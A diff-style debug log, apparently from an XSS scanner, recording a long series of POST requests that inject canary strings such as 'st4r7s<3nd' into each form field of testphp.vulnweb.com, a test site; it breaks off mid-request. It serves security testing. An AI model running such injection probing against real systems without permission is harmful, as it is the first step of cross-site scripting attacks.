+2024-01-20 21:52:54,921 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:52:54,921 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:54,921 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "",
+  "uemail": "",
+  "uphone": "st4r7s>3nd"
+}
+2024-01-20 21:52:54,921 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:57,466 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:52:57,466 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:57,466 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "",
+  "uemail": "",
+  "uphone": "",
+  "signup": "v3dm0s"
+}
+2024-01-20 21:52:57,466 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:53:00,043 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:53:00,043 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:53:00,043 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "",
+  "uemail": "",
+  "uphone": "",
+  "signup": "st4r7s<3nd"
+}
+2024-01-20 21:53:00,043 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:53:02,552 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:53:02,552 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:53:02,552 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "",
+  "uemail": "",
+  "uphone": "",
+  "signup": "st4r7s>3nd"
+}
+2024-01-20 21:53:02,552 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:53:05,066 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:53:05,066 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:53:05,066 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "",
+  "uemail": "",
+  "uphone": "",
+  "signup": "signup",
+  "searchFor": "v3dm0s"
+}
+2024-01-20 21:53:05,067 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:53:07,560 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:53:07,560 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:53:07,560 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "",
+  "uemail": "",
+  "uphone": "",
+  "signup": "signup",
+  "searchFor": "st4r7s<3nd"
+}
+2024-01-20 21:53:07,561 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:53:10,102 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:53:10,102 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:53:10,102 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "",
+  "uemail": "",
+  "uphone": "",
+  "signup": "signup",
+  "searchFor": "st4r7s>3nd"
+}
+2024-01-20 21:53:10,102 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:53:12,606 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:53:12,606 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:53:12,606 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "",
+  "uemail": "",
+  "uphone": "",
+  "signup": "signup",
+  "searchFor": "",
+  "goButton": "v3dm0s"
+}
+2024-01-20 21:53:12,606 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:53:15,123 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:53:15,123 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:53:15,123 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "",
+  "uemail": "",
+  "uphone": "",
+  "signup": "signup",
+  "searchFor": "",
+  "goButton": "st4r7s<3nd"
+}
+2024-01-20 21:53:15,124 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:53:17,679 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:53:17,679 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:53:17,679 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "",
+  "uemail": "",
+  "uphone": "",
+  "signup": "signup",
+  "searchFor": "",
+  "goButton": "st4r7s>3nd"
+}
+2024-01-20 21:53:17,679 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:53:20,206 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:53:20,206 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:53:20,206 core.requester - DEBUG - Requester data: {
+  "uuname": "v3dm0s"
+}
+2024-01-20 21:53:20,206 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:53:22,746 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:53:22,746 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:53:22,746 core.requester - DEBUG - Requester data: {
+  "uuname": "st4r7s<3nd"
+}
+2024-01-20 21:53:22,746 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:53:25,337 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:53:25,337 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:53:25,337 core.requester - DEBUG - Requester data: {
+  "uuname": "st4r7s>3nd"
+}
+2024-01-20 21:53:25,338 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:53:27,864 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:53:27,864 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:53:27,864 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "v3dm0s"
+}
+2024-01-20 21:53:27,864 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:53:30,537 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:53:30,537 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:53:30,537 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "st4r7s<3nd"
+}
+2024-01-20 21:53:30,537 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:53:33,046 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:53:33,046 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:53:33,048 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "st4r7s>3nd"
+}
+2024-01-20 21:53:33,048 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:53:35,563 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:53:35,563 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:53:35,563 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "v3dm0s"
+}
+2024-01-20 21:53:35,563 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:53:38,120 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:53:38,120 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:53:38,120 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "st4r7s<3nd"
+}
+2024-01-20 21:53:38,120 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:53:40,650 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:53:40,650 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:53:40,650 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "st4r7s>3nd"
+}
+2024-01-20 21:53:40,651 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:53:43,176 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:53:43,176 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:53:43,176 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "v3dm0s"
+}
+2024-01-20 21:53:43,176 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:53:45,722 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:53:45,722 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:53:45,722 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "st4r7s<3nd"
+}
+2024-01-20 21:53:45,722 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:53:48,240 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:53:48,240 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:53:48,240 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "st4r7s>3nd"
+}
+2024-01-20 21:53:48,241 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:53:50,777 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:53:50,777 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:53:50,777 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "v3dm0s"
+}
+2024-01-20 21:53:50,777 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:53:53,279 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:53:53,279 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:53:53,279 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "st4r7s<3nd"
+}
+2024-01-20 21:53:53,279 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:53:55,763 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:53:55,763 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:53:55,763 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "st4r7s>3nd"
+}
+2024-01-20 21:53:55,763 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:53:58,269 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:53:58,269 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:53:58,269 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "",
+  "uemail": "v3dm0s"
+}
+2024-01-20 21:53:58,270 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:54:00,884 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:54:00,884 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:54:00,884 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "",
+  "uemail": "st4r7s<3nd"
+}
+2024-01-20 21:54:00,885 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:54:03,411 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:54:03,411 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:54:03,411 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "",
+  "uemail": "st4r7s>3nd"
+}
+2024-01-20 21:54:03,411 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:54:05,907 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:54:05,907 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:54:05,907 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "",
+  "uemail": "",
+  "uphone": "v3dm0s"
+}
+2024-01-20 21:54:05,908 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:54:08,449 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:54:08,449 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:54:08,449 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "",
+  "uemail": "",
+  "uphone": "st4r7s<3nd"
+}
+2024-01-20 21:54:08,449 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:54:10,946 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:54:10,946 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:54:10,946 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "",
+  "uemail": "",
+  "uphone": "st4r7s>3nd"
+}
+2024-01-20 21:54:10,946 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:54:13,479 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:54:13,479 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:54:13,479 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "",
+  "uemail": "",
+  "uphone": "",
+  "signup": "v3dm0s"
+}
+2024-01-20 21:54:13,480 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:54:15,982 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:54:15,982 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:54:15,982 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "",
+  "uemail": "",
+  "uphone": "",
+  "signup": "st4r7s<3nd"
+}
+2024-01-20 21:54:15,982 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
